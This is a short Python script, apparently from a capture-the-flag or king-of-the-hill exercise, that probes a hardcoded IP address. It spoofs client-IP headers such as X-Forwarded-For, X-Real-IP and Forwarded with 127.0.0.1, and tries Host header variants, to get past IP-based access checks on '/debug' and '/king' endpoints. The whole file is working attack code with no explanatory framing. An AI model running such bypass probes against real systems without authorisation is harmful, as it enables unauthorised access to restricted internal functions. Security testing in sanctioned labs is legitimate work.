import requests
B="http://13.37.197.230:28490"
s=requests.Session()

internal_ips=["127.0.0.1","localhost","::1","10.0.0.1","192.168.0.1"]
hdr_names=["X-Forwarded-For","X-Real-IP","X-Originating-IP","X-Remote-IP",
           "X-Remote-Addr","X-Client-IP","Client-IP","True-Client-IP",
           "X-Forwarded-Host","Forwarded","X-Forwarded","CF-Connecting-IP"]

def get(path, headers):
    r=s.get(B+path, headers=headers, timeout=10)
    return r.status_code, r.text[:200]

print("== baseline ==")
print("/debug", get("/debug", {}))
print("/king", get("/king", {}))

print("\n== single header spoof on /debug ==")
for h in hdr_names:
    for ip in ["127.0.0.1"]:
        val = f"for={ip}" if h=="Forwarded" else ip
        code,body=get("/debug", {h:val})
        if code!=403 or "internal" not in body:
            print(f"[{code}] {h}: {val} -> {body}")

print("\n== Host header variants ==")
for host in ["localhost","127.0.0.1","throne-01","internal"]:
    code,body=get("/debug", {"Host":host})
    print(f"[{code}] Host: {host} -> {body}")

print("\n== same spoof on /king ==")
for h in ["X-Forwarded-For","X-Real-IP"]:
    code,body=get("/king", {h:"127.0.0.1"})
    print(f"[{code}] {h} -> {body}")
